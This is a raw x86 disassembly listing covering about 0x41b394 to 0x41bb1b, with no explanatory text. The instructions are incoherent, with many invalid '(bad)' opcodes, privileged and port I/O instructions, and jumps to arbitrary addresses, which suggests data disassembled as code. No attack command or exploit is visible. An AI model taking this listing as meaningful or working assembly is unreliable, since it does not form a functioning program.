  41b394:	ficomp WORD PTR [ebx+0x49843ea5]
  41b39a:	xchg   esp,eax
  41b39b:	retf   0x2c6
  41b39e:	add    BYTE PTR [ecx],ch
  41b3a0:	xchg   edi,eax
  41b3a1:	xor    al,0xac
  41b3a3:	mov    al,0x54
  41b3a5:	dec    edx
  41b3a6:	add    al,0x83
  41b3a8:	lock (bad) [esp+edx*4-0x5b]
  41b3ad:	sub    bl,0x61
  41b3b0:	jge    0x41b3c7
  41b3b2:	retf   0x7d5f
  41b3b5:	jns    0x41b41d
  41b3b7:	cmp    eax,0xeb3b0ca5
  41b3bc:	or     BYTE PTR [esi+ebp*2+0x28cfec],0x0
  41b3c4:	mov    cl,0x67
  41b3c6:	xchg   BYTE PTR [edx],ah
  41b3c8:	fmul   DWORD PTR [eax+0x45]
  41b3cb:	xchg   BYTE PTR [edi-0x2d6edc72],cl
  41b3d1:	xor    ch,BYTE PTR [ebx-0x37fbea7a]
  41b3d7:	mov    ch,0x44
  41b3d9:	addr16 stc 
  41b3db:	pop    eax
  41b3dc:	retf   0xd3d8
  41b3df:	imul   ebx,DWORD PTR [eax-0x538cd82b],0x60a68897
  41b3e9:	adc    al,0x46
  41b3eb:	lea    ebp,[ecx+ebx*1]
  41b3ee:	inc    esp
  41b3ef:	and    DWORD PTR [edi],0xc212c94c
  41b3f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3f6:	fcmovnb st,st(6)
  41b3f8:	sbb    DWORD PTR [edi],0x4cf7b3a0
  41b3fe:	dec    edx
  41b3ff:	gs lock jo 0x41b41d
  41b403:	push   ss
  41b404:	adc    edx,edi
  41b406:	push   edx
  41b407:	add    BYTE PTR [ebp+0x12401559],dh
  41b40d:	int    0xfe
  41b40f:	mov    cl,0x24
  41b411:	dec    edi
  41b412:	add    bl,BYTE PTR [ebx-0x7e9852c9]
  41b418:	jle    0x41b489
  41b41a:	test   al,0xb1
  41b41c:	dec    esp
  41b41d:	mov    ds:0x935063bb,eax
  41b422:	int3   
  41b423:	sbb    esi,esp
  41b425:	pop    ebp
  41b426:	adc    eax,0x81943f51
  41b42b:	in     al,dx
  41b42c:	adc    cl,al
  41b42e:	xchg   esp,eax
  41b42f:	dec    ebx
  41b430:	push   ebp
  41b431:	test   DWORD PTR [esi+0x7e],esp
  41b434:	(bad)  
  41b435:	adc    DWORD PTR [ebp-0x4716c0b3],ecx
  41b43b:	ret    0x521f
  41b43e:	jecxz  0x41b3c8
  41b440:	sub    al,0x29
  41b442:	push   edx
  41b443:	xor    cl,BYTE PTR ds:[ebx]
  41b446:	jl     0x41b40e
  41b448:	stos   DWORD PTR es:[edi],eax
  41b449:	pop    edx
  41b44a:	pop    esi
  41b44b:	(bad)  [edx+0x20e962c2]
  41b451:	int3   
  41b452:	ins    DWORD PTR es:[edi],dx
  41b453:	imul   ecx,ebp,0xde5b83cb
  41b459:	outs   dx,BYTE PTR ds:[esi]
  41b45a:	mov    al,ds:0x2086bb47
  41b45f:	aad    0x92
  41b461:	sub    BYTE PTR [ebp-0x4f],0xd2
  41b465:	and    ch,BYTE PTR [esi+0x1c]
  41b468:	pop    es
  41b469:	jno    0x41b4c3
  41b46b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b46c:	icebp  
  41b46d:	ds ja  0x41b4c4
  41b470:	mov    al,ds:0x81c31d8b
  41b475:	hlt    
  41b476:	icebp  
  41b477:	fwait
  41b478:	test   al,0x1b
  41b47a:	sahf   
  41b47b:	(bad)  
  41b47c:	(bad)  
  41b47d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b47e:	sub    dh,cl
  41b480:	ss ja  0x41b4c3
  41b483:	pop    ebx
  41b484:	add    DWORD PTR [ebp-0x67a1c429],0xffffff8f
  41b48b:	test   BYTE PTR [ecx-0x6b],dh
  41b48e:	jmp    0x13825d2a
  41b493:	outs   dx,BYTE PTR ds:[esi]
  41b494:	fdivr  DWORD PTR [ebp-0x74]
  41b497:	into   
  41b498:	(bad)  
  41b499:	js     0x41b50c
  41b49b:	out    0x94,eax
  41b49d:	jno    0x41b43c
  41b49f:	xchg   edi,eax
  41b4a0:	addr16 mov edx,0x7f09415f
  41b4a6:	adc    al,0xf8
  41b4a8:	test   al,0x10
  41b4aa:	inc    ebp
  41b4ab:	mov    al,0x2a
  41b4ad:	lahf   
  41b4ae:	not    DWORD PTR [eax-0x246bb0ac]
  41b4b4:	inc    esp
  41b4b5:	inc    eax
  41b4b6:	pushf  
  41b4b7:	fwait
  41b4b8:	cld    
  41b4b9:	mov    edi,0x862055b1
  41b4be:	fistp  QWORD PTR [ecx+0x327faf52]
  41b4c4:	repz test BYTE PTR [ebx+esi*4],bl
  41b4c8:	js     0x41b494
  41b4ca:	fldenv [edi-0x63d07719]
  41b4d0:	pop    ebx
  41b4d1:	stos   DWORD PTR es:[edi],eax
  41b4d2:	pop    ebp
  41b4d3:	and    ebp,DWORD PTR [esi]
  41b4d5:	cdq    
  41b4d6:	(bad)  
  41b4d7:	cmp    BYTE PTR [ebx+0x4f],cl
  41b4da:	pop    ss
  41b4db:	pop    eax
  41b4dc:	sbb    eax,0xd2c40a60
  41b4e1:	sub    BYTE PTR [ebx-0x4d5a5206],0xd6
  41b4e8:	push   es
  41b4e9:	xor    al,0x6a
  41b4eb:	lock and dh,BYTE PTR gs:[esi+0x76a7b4c8]
  41b4f3:	mov    ch,0xe3
  41b4f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4f6:	jmp    0x75eafd18
  41b4fb:	mov    eax,0x8aa3a14a
  41b500:	xchg   ecx,eax
  41b501:	cld    
  41b502:	add    eax,0xf177c111
  41b507:	ret    0xadf9
  41b50a:	lea    esp,[edi+0x17]
  41b50d:	hlt    
  41b50e:	cwde   
  41b50f:	jnp    0x41b535
  41b511:	xchg   ecx,edx
  41b513:	cmp    eax,0xcf7c83c3
  41b518:	or     eax,0xdde109a2
  41b51d:	inc    ecx
  41b51e:	(bad)  
  41b51f:	mov    esi,0xb342ec9c
  41b524:	xchg   edx,eax
  41b525:	xor    DWORD PTR [edi-0x3fc91c37],esi
  41b52b:	xsaves [ebx+0x46f7d049]
  41b532:	fmul   st(1),st
  41b534:	mov    ch,0x7d
  41b536:	js     0x41b54e
  41b538:	(bad)  
  41b53a:	loopne 0x41b5a0
  41b53c:	call   0x93ae47b3
  41b541:	fcomp  QWORD PTR [eax+0x54]
  41b544:	adc    cl,dh
  41b546:	and    DWORD PTR [edi+0x551c75df],ebx
  41b54c:	sub    al,0xe9
  41b54e:	lea    edx,[edx-0x75f4573e]
  41b554:	push   esi
  41b555:	push   esp
  41b556:	loope  0x41b57e
  41b558:	repz aas 
  41b55a:	pop    edx
  41b55b:	pop    edi
  41b55c:	das    
  41b55d:	(bad)  
  41b55e:	pop    edx
  41b55f:	scas   al,BYTE PTR es:[edi]
  41b560:	loop   0x41b52d
  41b562:	ja     0x41b515
  41b564:	cli    
  41b565:	loop   0x41b583
  41b567:	popa   
  41b568:	ja     0x41b4f4
  41b56a:	xchg   ebx,eax
  41b56b:	shl    BYTE PTR [ebx],0xa3
  41b56e:	pop    esp
  41b56f:	cmp    DWORD PTR [eax+0xc],ebx
  41b572:	push   ecx
  41b573:	addr16 std 
  41b575:	mov    edi,0xbd577ab3
  41b57a:	push   edi
  41b57b:	and    bh,ah
  41b57d:	mov    BYTE PTR [esi-0x4b8eb647],bh
  41b583:	sub    edi,DWORD PTR [ebx+0x1ab1e2fb]
  41b589:	inc    esi
  41b58a:	pop    esp
  41b58b:	sbb    al,0x45
  41b58d:	out    dx,al
  41b58e:	xchg   esp,eax
  41b58f:	and    ecx,eax
  41b591:	int3   
  41b592:	jg     0x41b5dd
  41b594:	sbb    ch,dl
  41b596:	cmp    eax,0x8086dabb
  41b59b:	(bad)  
  41b59c:	ds jb  0x41b56d
  41b59f:	mov    ds:0x53a70ddf,al
  41b5a4:	lods   al,BYTE PTR ds:[esi]
  41b5a5:	mov    ebp,0x736e5c3f
  41b5aa:	xor    BYTE PTR [edi-0x52],dh
  41b5ad:	dec    edi
  41b5ae:	sub    dh,ah
  41b5b0:	idiv   BYTE PTR ds:0x99a024f1
  41b5b6:	imul   ebx,DWORD PTR [ecx-0x65],0x619645f8
  41b5bd:	fs shr bh,cl
  41b5c0:	sti    
  41b5c1:	push   eax
  41b5c2:	and    DWORD PTR [ebp+0x13],esi
  41b5c5:	out    dx,eax
  41b5c6:	mov    WORD PTR [ebx+0x45],ds
  41b5c9:	push   es
  41b5ca:	test   DWORD PTR [esp+eiz*2+0x5c],esi
  41b5ce:	adc    al,0xeb
  41b5d0:	aad    0x40
  41b5d2:	pop    es
  41b5d3:	test   eax,0x5fb5349
  41b5d8:	shl    DWORD PTR [ebx+0x5c],cl
  41b5db:	mov    cl,bh
  41b5dd:	mov    bh,0x1
  41b5df:	aas    
  41b5e0:	lahf   
  41b5e1:	pop    ebx
  41b5e2:	sbb    eax,0x2fcf66b3
  41b5e7:	push   eax
  41b5e8:	cld    
  41b5e9:	out    0xf5,eax
  41b5eb:	lock sbb cl,BYTE PTR [edx]
  41b5ee:	mov    bl,0xa0
  41b5f0:	js     0x41b5f3
  41b5f2:	mov    bl,0x68
  41b5f4:	fst    QWORD PTR [ebp+0x686733db]
  41b5fa:	xchg   edi,eax
  41b5fb:	outs   dx,DWORD PTR ds:[esi]
  41b5fc:	repnz (bad) 
  41b5fe:	ret    0xdc11
  41b601:	push   edi
  41b602:	rcl    DWORD PTR [esp+ebp*1],1
  41b605:	inc    ebp
  41b606:	retf   
  41b607:	idiv   DWORD PTR [ebx-0x398a913c]
  41b60d:	pop    ecx
  41b60e:	sub    al,0xdd
  41b610:	or     cl,BYTE PTR [eax-0x24]
  41b613:	aad    0xc7
  41b615:	ss out dx,al
  41b617:	push   cs
  41b618:	pop    es
  41b619:	add    eax,0x7dc1cf98
  41b61e:	mov    eax,ds:0xe24e48d
  41b623:	push   ebp
  41b624:	outs   dx,BYTE PTR ds:[esi]
  41b625:	ficomp WORD PTR [eax+0x1d]
  41b628:	mov    dh,0x6
  41b62a:	and    ebp,DWORD PTR [ebp+ebx*8+0x1f]
  41b62e:	add    DWORD PTR [ebx],0x72c26549
  41b634:	mov    cl,0x2f
  41b636:	and    eax,0x207e5a47
  41b63b:	pop    edi
  41b63c:	js     0x41b655
  41b63e:	mov    WORD PTR [edx+0x61e9f60e],?
  41b644:	adc    eax,DWORD PTR [ebx]
  41b646:	push   cs
  41b647:	iret   
  41b648:	div    DWORD PTR [eax]
  41b64a:	mov    edi,0x118850f2
  41b64f:	fadd   DWORD PTR [edi-0x52]
  41b652:	das    
  41b653:	aam    0xbf
  41b655:	sub    BYTE PTR [esi-0x1d],bl
  41b658:	dec    ebx
  41b659:	mov    ds:0xee968362,al
  41b65e:	(bad)  
  41b65f:	stc    
  41b660:	retf   0xe704
  41b663:	(bad)  
  41b665:	adc    al,0x28
  41b667:	and    dl,BYTE PTR [ebp+0x485c1a0d]
  41b66d:	(bad)  
  41b66e:	mov    esi,0xfae30fb0
  41b673:	popa   
  41b674:	call   0x1781:0xfea6f750
  41b67b:	fimul  WORD PTR [ebx]
  41b67d:	mov    ebx,0xe41b9b41
  41b682:	js     0x41b694
  41b684:	pop    ecx
  41b685:	pop    esp
  41b686:	sbb    al,ah
  41b688:	lds    edi,FWORD PTR [edx]
  41b68a:	jmp    edi
  41b68c:	fwait
  41b68d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b68e:	dec    DWORD PTR [ebx+esi*2]
  41b691:	in     al,dx
  41b692:	push   esp
  41b693:	mov    esi,0x388f8562
  41b698:	bound  esp,QWORD PTR [ecx-0x1a]
  41b69b:	std    
  41b69c:	xor    bl,BYTE PTR [eax-0x11b6de8d]
  41b6a2:	iret   
  41b6a3:	dec    ebx
  41b6a4:	mov    edx,0xd8c584e7
  41b6a9:	inc    ecx
  41b6aa:	call   0x212d:0xfc3b6e69
  41b6b1:	mov    bx,0x9566
  41b6b5:	ja     0x41b6d6
  41b6b7:	jo     0x41b64d
  41b6b9:	sbb    al,0xcd
  41b6bb:	nop
  41b6bc:	pop    es
  41b6bd:	rol    BYTE PTR [ecx+0x53],cl
  41b6c0:	fs mov ch,ah
  41b6c3:	jno    0x41b728
  41b6c5:	sbb    BYTE PTR [ebx],0xdf
  41b6c8:	in     eax,0x70
  41b6ca:	inc    edx
  41b6cc:	jg     0x41b6d5
  41b6ce:	aad    0xe6
  41b6d0:	jne    0x41b6e9
  41b6d2:	outs   dx,BYTE PTR ds:[esi]
  41b6d3:	mov    ah,0xe3
  41b6d5:	imul   esi,DWORD PTR ds:0x121da9fb,0xffffffa8
  41b6dc:	aam    0x48
  41b6de:	test   bh,0x40
  41b6e1:	mov    edx,?
  41b6e3:	pusha  
  41b6e4:	and    bh,BYTE PTR [edi]
  41b6e6:	push   esp
  41b6e7:	push   ds
  41b6e8:	mov    ds:0xbad76979,eax
  41b6ed:	xchg   cl,cl
  41b6ef:	inc    esp
  41b6f0:	mov    ecx,0xefd1f24a
  41b6f5:	out    dx,eax
  41b6f6:	dec    edi
  41b6f7:	rcl    DWORD PTR [eax],cl
  41b6f9:	jnp    0x41b71e
  41b6fb:	daa    
  41b6fc:	pop    edi
  41b6fd:	adc    al,0xd1
  41b6ff:	inc    esp
  41b700:	mov    bl,0xc8
  41b702:	sub    eax,0xddc6adc1
  41b707:	and    al,0x48
  41b709:	cld    
  41b70a:	jecxz  0x41b6df
  41b70c:	push   ebx
  41b70d:	repnz dec edi
  41b70f:	push   ebx
  41b710:	push   ecx
  41b711:	sub    BYTE PTR ds:0xe83f24d1,al
  41b717:	aaa    
  41b718:	jge    0x41b76b
  41b71a:	test   al,0x7f
  41b71c:	pop    ecx
  41b71d:	idiv   BYTE PTR ds:0xcd76db90
  41b723:	ds dec edi
  41b725:	sub    DWORD PTR gs:[edi-0xc],edx
  41b729:	push   cs
  41b72a:	cdq    
  41b72b:	jecxz  0x41b79b
  41b72d:	mov    DWORD PTR [ebp+0x5c43a1a5],esp
  41b733:	test   edi,esi
  41b735:	mov    esp,0xe3bd6bb5
  41b73a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b73b:	js     0x41b785
  41b73d:	call   0x23a8eaba
  41b742:	push   edi
  41b743:	adc    bl,dl
  41b745:	(bad)  
  41b746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b747:	imul   edx,DWORD PTR [ebx+0x4d],0xe99dcf65
  41b74e:	adc    DWORD PTR [esi],0x66c845fa
  41b754:	mov    ebx,0x46822a68
  41b759:	jno    0x41b762
  41b75b:	mov    eax,0xb3d0ec2
  41b760:	xor    ecx,DWORD PTR ds:0x9c185759
  41b766:	mov    ch,cl
  41b768:	rol    BYTE PTR [ecx],1
  41b76a:	fs in  al,dx
  41b76c:	in     eax,0x22
  41b76e:	rcl    al,1
  41b770:	dec    ecx
  41b771:	lods   eax,DWORD PTR ds:[esi]
  41b772:	mov    dh,0x51
  41b774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b775:	and    al,0xed
  41b777:	(bad)  
  41b778:	mov    edi,0xcb231ae
  41b77d:	sbb    DWORD PTR [ecx+eax*2-0x52],edx
  41b781:	or     dl,0x68
  41b784:	gs mov ebx,0x4905fa78
  41b78a:	iret   
  41b78b:	sbb    BYTE PTR [ecx-0x51],bl
  41b78e:	mov    bl,0x82
  41b790:	pop    esi
  41b791:	jl     0x41b71c
  41b793:	xchg   esp,eax
  41b794:	jge    0x41b7ed
  41b796:	pop    eax
  41b797:	daa    
  41b798:	aad    0x1d
  41b79a:	pop    esp
  41b79b:	sub    eax,0xaae8d5f
  41b7a0:	push   ds
  41b7a1:	inc    edi
  41b7a2:	stos   BYTE PTR es:[edi],al
  41b7a3:	(bad)  
  41b7a5:	inc    edi
  41b7a6:	daa    
  41b7a7:	xchg   esp,eax
  41b7a8:	cld    
  41b7a9:	mov    edx,0x6dd1074a
  41b7ae:	pop    edi
  41b7af:	adc    al,0x5
  41b7b1:	mov    cr4,esi
  41b7b4:	mov    cl,0x9e
  41b7b6:	(bad)  
  41b7b7:	(bad)  
  41b7b8:	and    ah,ah
  41b7ba:	jns    0x41b827
  41b7bc:	bound  ebp,QWORD PTR [ebx+0x14]
  41b7bf:	in     al,dx
  41b7c0:	sti    
  41b7c1:	mov    WORD PTR [ebp-0x5abf85e2],ss
  41b7c7:	addr16 push eax
  41b7c9:	(bad)  
  41b7cb:	(bad)  
  41b7cc:	in     al,dx
  41b7cd:	daa    
  41b7ce:	js     0x41b825
  41b7d0:	mov    ch,0xd2
  41b7d2:	jmp    0x41b7ac
  41b7d4:	sub    eax,0x6eb83e65
  41b7d9:	or     al,0x5b
  41b7db:	mov    dh,0xc3
  41b7dd:	stc    
  41b7de:	rol    BYTE PTR [ecx+0xc],0xd
  41b7e2:	push   edx
  41b7e3:	push   esi
  41b7e4:	in     al,0xc4
  41b7e6:	cmp    BYTE PTR [ebx],dl
  41b7e8:	daa    
  41b7e9:	(bad)  
  41b7ea:	xor    BYTE PTR [ebp-0x56],ah
  41b7ed:	jae    0x41b85d
  41b7ef:	mov    ds:0x6e34a835,al
  41b7f4:	int3   
  41b7f5:	pop    ebx
  41b7f6:	inc    edx
  41b7f7:	cmp    BYTE PTR [edx+0x79e866b6],bh
  41b7fd:	xchg   edx,ecx
  41b7ff:	repnz pushf 
  41b801:	mov    es,WORD PTR [eax-0x775a6a07]
  41b807:	add    BYTE PTR [edx+0x75165836],ch
  41b80d:	cmp    DWORD PTR [edi+0x52],edi
  41b810:	(bad)
  41b814:	xor    ebx,DWORD PTR [esp+esi*8+0x591e2d07]
  41b81b:	js     0x41b889
  41b81d:	shl    DWORD PTR [esi],0x5
  41b820:	(bad)  
  41b821:	fld    DWORD PTR [ebx]
  41b823:	je     0x41b89a
  41b825:	add    DWORD PTR [ebx+esi*1+0x5b],edx
  41b829:	mov    WORD PTR [edx+0x2a0b20e7],ss
  41b82f:	fwait
  41b830:	xor    DWORD PTR [ebx],esi
  41b832:	retf   0xce2f
  41b835:	push   ecx
  41b836:	imul   ebp,DWORD PTR [ebx-0x31],0x63
  41b83a:	jge    0x41b8b9
  41b83c:	popa   
  41b83d:	fwait
  41b83e:	arpl   WORD PTR [eax+0x68],ax
  41b841:	test   eax,0x16656bab
  41b846:	and    al,0xfd
  41b848:	dec    eax
  41b849:	lea    eax,[esi]
  41b84b:	mov    ebp,0xad925aab
  41b850:	mov    ebx,0x1ab6f3a6
  41b855:	jns    0x41b88f
  41b857:	sub    eax,DWORD PTR [edi-0x7e]
  41b85a:	(bad)  
  41b85b:	js     0x41b8b7
  41b85d:	test   al,0x47
  41b85f:	add    dh,BYTE PTR [ebx]
  41b861:	aaa    
  41b862:	data16 fmul QWORD PTR ds:0x73ee6ce8
  41b869:	ret    
  41b86a:	mov    bl,0xf6
  41b86c:	xor    eax,0xbb19175e
  41b871:	cdq    
  41b872:	jmp    0x41b82b
  41b874:	xchg   ebx,eax
  41b875:	adc    DWORD PTR [edx],0x2
  41b878:	add    ecx,0xffffffe9
  41b87b:	inc    eax
  41b87c:	pop    esp
  41b87d:	xchg   ebp,eax
  41b87e:	add    dh,BYTE PTR [edi+0xb5b5df5]
  41b884:	outs   dx,DWORD PTR ds:[esi]
  41b885:	push   ebx
  41b886:	jmp    0xf9c19fe
  41b88b:	and    al,0x42
  41b88d:	sahf   
  41b88e:	call   0xa446:0xbdaf6921
  41b895:	test   al,0x31
  41b897:	ficom  WORD PTR [ecx]
  41b899:	ds cmc 
  41b89b:	mov    ebx,0xee1a0450
  41b8a0:	pop    ecx
  41b8a1:	leave  
  41b8a2:	cs sbb al,0x2c
  41b8a5:	add    al,0x2b
  41b8a7:	aaa    
  41b8a8:	xchg   esp,eax
  41b8a9:	mov    edx,0x3b4c5b96
  41b8ae:	push   ebp
  41b8af:	outs   dx,DWORD PTR ds:[esi]
  41b8b0:	mov    eax,0x8175c39a
  41b8b5:	add    bh,BYTE PTR [ebp+0x7a]
  41b8b8:	call   ebp
  41b8ba:	cmp    BYTE PTR [edi],al
  41b8bc:	stc    
  41b8bd:	fdivr  DWORD PTR [esi]
  41b8bf:	inc    ebp
  41b8c0:	stos   DWORD PTR es:[edi],eax
  41b8c1:	pop    esp
  41b8c2:	jle    0x41b8b0
  41b8c4:	sahf   
  41b8c5:	or     ecx,ecx
  41b8c7:	jae    0x41b8d9
  41b8c9:	cmc    
  41b8ca:	add    BYTE PTR [ebx],cl
  41b8cc:	cmp    bl,BYTE PTR [ecx-0x12]
  41b8cf:	mov    dh,0x33
  41b8d1:	add    bh,BYTE PTR [esi]
  41b8d3:	mov    edx,ecx
  41b8d5:	cs xchg edi,eax
  41b8d7:	sub    BYTE PTR [edx-0x19572bd4],al
  41b8dd:	imul   ebx,DWORD PTR [eax],0x1fb19cac
  41b8e3:	int3   
  41b8e4:	leave  
  41b8e5:	jo     0x41b962
  41b8e7:	mov    dl,0x24
  41b8e9:	jmp    0x41b895
  41b8eb:	and    eax,0x20daf1bb
  41b8f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8f1:	mov    dl,dh
  41b8f3:	inc    edi
  41b8f4:	ficom  WORD PTR [esp+ebp*8]
  41b8f7:	inc    esp
  41b8f8:	fcom   QWORD PTR cs:[edx+0xec7ce06]
  41b8ff:	lds    ecx,FWORD PTR [ebx+0x533ac0]
  41b905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b906:	dec    edx
  41b907:	lea    esp,[esi]
  41b909:	push   edx
  41b90a:	mov    esp,0xe33d5029
  41b90f:	jle    0x41b8cf
  41b911:	loop   0x41b90f
  41b913:	es mov bh,0xd1
  41b916:	imul   edx,esp,0xffffffc5
  41b919:	jo     0x41b89c
  41b91b:	fnstsw WORD PTR [ecx]
  41b91d:	sti    
  41b91e:	mov    ds:0x915fc26e,eax
  41b923:	add    esp,DWORD PTR [ecx+0x18445ea8]
  41b929:	je     0x41b99a
  41b92b:	ja     0x41b98d
  41b92d:	call   0xab97:0x1300198a
  41b934:	mov    edi,0xeae5ff8
  41b939:	dec    ebp
  41b93a:	retf   0x6033
  41b93d:	sar    BYTE PTR [edx+0x6fe58b3e],0x52
  41b944:	call   0x9dfa:0xfc2b4dc5
  41b94b:	mov    edi,eax
  41b94d:	leave  
  41b94e:	popf   
  41b94f:	xor    BYTE PTR [edx],cl
  41b951:	pop    ebx
  41b952:	retf   0xc7c0
  41b955:	pop    es
  41b956:	call   0xd0b2:0x8cefca77
  41b95d:	mov    cl,0xf0
  41b95f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b960:	(bad)  
  41b961:	cmc    
  41b962:	or     eax,0xa145de21
  41b967:	and    eax,0xd61cad08
  41b96c:	loope  0x41b964
  41b96e:	mov    al,0xef
  41b970:	sbb    eax,DWORD PTR [eax+edx*4+0x76fe7126]
  41b977:	adc    al,BYTE PTR [edx+ebp*8]
  41b97a:	xchg   BYTE PTR [edi+edi*2+0x64],cl
  41b97e:	and    DWORD PTR [edx+0x26],ebp
  41b981:	cs or  al,0x84
  41b984:	aam    0xba
  41b986:	loop   0x41b9fc
  41b988:	clc    
  41b989:	jno    0x41b9a8
  41b98b:	daa    
  41b98c:	test   ecx,edi
  41b98e:	xor    DWORD PTR [ebx-0x184c5085],edi
  41b994:	mov    esp,DWORD PTR [ebp-0x4cb5e7d]
  41b99a:	popa   
  41b99b:	bound  eax,QWORD PTR [ebx+eiz*4]
  41b99e:	es xchg edi,eax
  41b9a0:	inc    edi
  41b9a1:	inc    ecx
  41b9a2:	out    dx,al
  41b9a3:	mov    dl,0x13
  41b9a5:	sbb    al,0x3d
  41b9a7:	aas    
  41b9a8:	mov    esi,0x11834f3d
  41b9ad:	clc    
  41b9ae:	sbb    al,0x37
  41b9b0:	xor    cl,bh
  41b9b2:	jbe    0x41b98d
  41b9b4:	clc    
  41b9b5:	and    esi,ebx
  41b9b7:	push   cs
  41b9b8:	jns    0x41ba24
  41b9ba:	sbb    eax,0xdb4594bb
  41b9bf:	jle    0x41b962
  41b9c1:	in     al,dx
  41b9c2:	lods   al,BYTE PTR ds:[esi]
  41b9c3:	mov    cl,0xfc
  41b9c5:	mov    eax,0x19e30908
  41b9ca:	fdivr  st(1),st
  41b9cc:	mov    ebx,0x4eaca234
  41b9d1:	cmp    eax,0x59889024
  41b9d7:	iret   
  41b9d8:	hlt    
  41b9d9:	jnp    0x41b9d0
  41b9db:	ret    
  41b9dc:	ds jnp 0x41b99f
  41b9df:	retf   0xcfa8
  41b9e2:	mov    WORD PTR [esi-0x1c234ee1],ds
  41b9e8:	sbb    bh,bl
  41b9ea:	int    0x42
  41b9ec:	or     edi,0x54dff720
  41b9f2:	mov    BYTE PTR [eax],ah
  41b9f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9f5:	mov    al,0x8e
  41b9f7:	loope  0x41b9fa
  41b9f9:	adc    bl,BYTE PTR [ebp+0x5c4cdb86]
  41b9ff:	sbb    al,0xa2
  41ba02:	test   eax,0x214ada55
  41ba07:	retf   
  41ba08:	call   FWORD PTR [ecx+0x4f0a2dc0]
  41ba0e:	dec    edx
  41ba0f:	out    dx,eax
  41ba10:	les    esi,FWORD PTR [edi]
  41ba12:	or     BYTE PTR [ebx],ah
  41ba14:	call   0x115347e
  41ba19:	sbb    BYTE PTR [ebx+edi*2+0x67],ah
  41ba1d:	loop   0x41b9b2
  41ba1f:	ja     0x41b9a2
  41ba21:	iret   
  41ba22:	or     edx,DWORD PTR [ebx+0x39d23517]
  41ba28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba29:	cmp    dl,BYTE PTR [edx]
  41ba2b:	inc    eax
  41ba2c:	scas   eax,DWORD PTR es:[edi]
  41ba2d:	sahf   
  41ba2e:	leave  
  41ba2f:	push   0xf7f31cf4
  41ba34:	ret    
  41ba35:	mov    edi,0x1b64a3c5
  41ba3a:	push   cs
  41ba3b:	push   0x2d03dc16
  41ba40:	daa    
  41ba41:	sub    eax,edx
  41ba43:	cmp    DWORD PTR [edi-0x61],esi
  41ba46:	repz scas al,BYTE PTR es:[edi]
  41ba48:	inc    ebx
  41ba49:	fnstcw WORD PTR [ebx-0x5e]
  41ba4c:	aam    0x78
  41ba4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba4f:	fucomip st,st(6)
  41ba51:	and    DWORD PTR [edx],esp
  41ba53:	clc    
  41ba54:	scas   eax,DWORD PTR es:[edi]
  41ba55:	not    ch
  41ba57:	mov    al,0xf7
  41ba59:	jmp    0x78da09bb
  41ba5e:	repz and DWORD PTR [edi-0x7b],ebp
  41ba62:	dec    eax
  41ba63:	cmp    eax,0x67156521
  41ba68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba69:	push   0x627accaa
  41ba6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba6f:	out    0xcc,al
  41ba71:	(bad)  
  41ba72:	(bad)  
  41ba73:	xor    esi,DWORD PTR [ebx-0x492de8e6]
  41ba79:	lods   eax,DWORD PTR ds:[esi]
  41ba7a:	mov    edi,0xa4977ffd
  41ba7f:	add    ebx,ebp
  41ba81:	in     eax,dx
  41ba82:	icebp  
  41ba83:	out    0x17,eax
  41ba85:	dec    ebp
  41ba86:	hlt    
  41ba87:	xchg   esp,eax
  41ba88:	pop    edi
  41ba89:	push   ebp
  41ba8a:	cld    
  41ba8b:	inc    edi
  41ba8c:	cmp    DWORD PTR [eax+eax*4+0x3f],0x73
  41ba91:	gs push 0xe7ade10f
  41ba97:	les    esi,FWORD PTR [edx-0x79296c48]
  41ba9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba9e:	push   esi
  41ba9f:	fisttp WORD PTR [ebx-0xa]
  41baa2:	js     0x41bb0c
  41baa4:	mov    esp,0x70693eff
  41baa9:	push   ebx
  41baaa:	jmp    0x6663e84
  41baaf:	(bad)  
  41bab0:	ret    
  41bab1:	mov    ch,0x1d
  41bab3:	sub    BYTE PTR [esi+0x3a42a51c],al
  41bab9:	push   ds
  41baba:	in     al,0x67
  41babc:	mov    BYTE PTR [ebp+0x6905819c],cl
  41bac2:	cmp    eax,0xbd6d32f3
  41bac7:	gs push ds
  41bac9:	inc    ebp
  41baca:	sub    bl,BYTE PTR [ebp-0x27]
  41bacd:	cmp    BYTE PTR [edx],bl
  41bacf:	retf   0xe563
  41bad2:	mov    BYTE PTR ds:0xdb5f34c8,dh
  41bad8:	sub    al,0x99
  41bada:	inc    esp
  41badb:	fst    DWORD PTR [ebx-0x17]
  41bade:	dec    esp
  41badf:	mov    al,0xe2
  41bae1:	das    
  41bae2:	fnstcw WORD PTR [edx]
  41bae4:	retf   
  41bae5:	push   ds
  41bae6:	xchg   ecx,eax
  41bae7:	daa    
  41bae8:	(bad)  
  41bae9:	mov    dl,0xd6
  41baeb:	mov    al,0x51
  41baed:	add    BYTE PTR [esi],bl
  41baef:	add    DWORD PTR ds:0x649e2206,edi
  41baf5:	or     eax,0xeae6608b
  41bafa:	jns    0x41bb12
  41bafc:	inc    esp
  41bafd:	dec    edi
  41bafe:	scas   al,BYTE PTR es:[edi]
  41baff:	jmp    0xe79a580f
  41bb04:	cmp    ch,BYTE PTR [ebx-0x3aaf66ce]
  41bb0a:	pop    ebp
  41bb0b:	xchg   esp,eax
  41bb0c:	push   ecx
  41bb0d:	jne    0x41bada
  41bb0f:	and    edi,ecx
  41bb11:	jmp    0xabdcfdb3
  41bb16:	aam    0x6d
  41bb18:	arpl   WORD PTR [ebx+0x78],di
  41bb1b:	ror    dl,cl
